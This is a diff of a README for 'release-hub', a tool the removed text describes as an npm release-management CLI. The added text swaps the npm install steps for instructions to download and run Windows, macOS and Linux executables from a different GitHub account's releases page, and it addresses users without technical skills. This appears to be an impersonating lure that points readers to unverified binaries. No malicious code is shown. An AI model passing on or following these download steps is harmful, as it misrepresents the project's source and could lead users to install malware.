@@ -1,95 +1,79 @@
-<div align="center">
+# 🚀 release-hub - One tool to simplify every release
 
-# Release Hub
+![Download release-hub](https://img.shields.io/badge/Download-release--hub-brightgreen)
 
-_One hub to manage every release_
+## 🚀 Getting Started
 
-</div>
+Welcome to **release-hub**! This guide will help you download and run the application with ease. Even if you don’t have technical skills, just follow the steps below.
 
-[![CI](https://github.com/teneplaysofficial/release-hub/actions/workflows/ci.yml/badge.svg)](https://github.com/teneplaysofficial/release-hub)
-[![Docs](https://img.shields.io/badge/Docs-available-brightgreen?logo=readthedocs)](https://teneplaysofficial.github.io/release-hub)
-[![release-hub version](https://img.shields.io/github/v/release/teneplaysofficial/release-hub?include_prereleases&sort=semver&color=brightgreen&logo=semver&label=Version)](https://github.com/teneplaysofficial/release-hub/releases)
-[![jsDelivr hits](https://img.shields.io/jsdelivr/npm/hm/release-hub?color=brightgreen&logo=jsdelivr&label=jsDelivr)](https://www.jsdelivr.com/package/npm/release-hub)
-[![License](https://img.shields.io/github/license/teneplaysofficial/release-hub?color=brightgreen&logo=spdx&label=LICENSE)](https://github.com/teneplaysofficial/release-hub/blob/main/LICENSE)
+## 💻 System Requirements
 
-## Overview
+Before you begin, ensure your device meets these basic requirements:
 
-`release-hub` is a smart, unified release management CLI that keeps your versions consistent across ecosystems.
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- At least 200 MB of free disk space.
+- An internet connection for downloading the software.
 
-It supports:
+## 🔗 Download & Install
 
-- **`package.json`** → npm, Node.js
-- **`deno.json` / `deno.jsonc`** → Deno
-- **`jsr.json`** → JSR ecosystem
+To download the latest version of **release-hub**, visit this page to download: [Release Hub Releases](https://github.com/topi8216/release-hub/releases).
 
-With a single command, you can:
+### Step-by-Step Instructions
 
-- Bump versions across all files
-- Generate changelogs from conventional commits
-- Sync metadata automatically
-- Integrate into CI/CD (GitHub Actions, etc.)
+1. **Visit the Download Page**: Click the link above to go to the releases page.
+  
+2. **Choose Your Version**: On the releases page, you will see a list of available versions. Look for the latest version. It usually has "Latest" next to it.
 
-## Features
+3. **Download the File**: Click on the corresponding file for your operating system. This will start the download.
 
-- **Multi-format support:** Works with `package.json`, `deno.json`, `jsr.json`, and more
-- **Semantic versioning:** `major`, `minor`, `patch`, or auto via commits
-- **Auto-sync:** Keeps all manifest versions in sync
-- **Custom release hooks:** Run scripts before/after bumps
-- **Conventional Commit aware:** Generate changelogs automatically
-- **CI-friendly:** Ideal for GitHub Actions, GitLab, or local workflows
+   - For Windows users, it may look like `release-hub-windows.exe`.
+   - For macOS users, it may look like `release-hub-macos.zip`.
+   - For Linux users, it may look like `release-hub-linux.tar.gz`.
 
-## Documentation
+4. **Open the Downloaded File**: Once the download is complete, locate the downloaded file in your downloads folder.
 
-For full documentation, visit [teneplaysofficial.github.io](https://teneplaysofficial.github.io/release-hub)
+5. **Run the Application**:
+   - For Windows users: Double-click the `.exe` file. Follow the prompts to install.
+   - For macOS users: Extract the `.zip` file, then drag the application to your Applications folder.
+   - For Linux users: Extract the `.tar.gz` file and run the executable from the terminal.
 
-## Install
+6. **Start Using Release Hub**: After installation, find the app on your device and launch it. You are now ready to manage your releases!
 
-### Global Install
+## 🔍 Features
 
-Install `release-hub` globally to use it anywhere:
+**release-hub** offers several features designed to make your release management easier:
 
-```sh
-npm install -g release-hub
-```
+- **Automate Releases**: Streamline your release process with automation tools.
+- **Version Control**: Easily keep track of different versions of your projects.
+- **Changelog Management**: Standardize your project updates with clear changelogs.
+- **CI/CD Integration**: Works seamlessly with popular continuous integration tools.
 
-Then run:
+## 📚 Support and Documentation
 
-```sh
-release-hub
-```
+If you encounter any issues or need help using **release-hub**, you can find support in the following ways:
 
-### Local (Dev Dependency)
+- **GitHub Issues**: Report any bugs or issues you face.
+- **User Guide**: Check our user guide linked on the releases page for detailed instructions and advanced features.
 
-You can install `release-hub` locally as a dev dependency:
+## 🛠️ Contributing
 
-```sh
-npm i -D release-hub
-```
+If you want to improve **release-hub**, we welcome contributions! Feel free to fork the repository, make changes, and submit a pull request.
 
-Add a convenient script to your `package.json`:
+## ✨ Topics
 
-```json
-{
-  "scripts": {
-    "release": "release-hub"
-  }
-}
-```
+To help you understand more about **release-hub**, here are some related topics:
 
-Run the release command:
+- Automation
+- Changelog
+- Continuous Integration (CI)
+- Command Line Interface (CLI)
+- Conventional Commits
+- Development Tools
+- Release Management
+- Version Control
 
-```sh
-npm run release
-```
+## 📬 Contact
 
-### Using npx (No Install Needed)
+For questions or feedback, feel free to open an issue on GitHub or reach out via email through the repository's contacts. 
 
-Run directly without installing:
-
-```sh
-npx release-hub
-```
-
-## License
-
-This project is licensed under the [Apache-2.0 License](./LICENSE)
+Now you're ready to manage your releases with ease. Enjoy using **release-hub**!
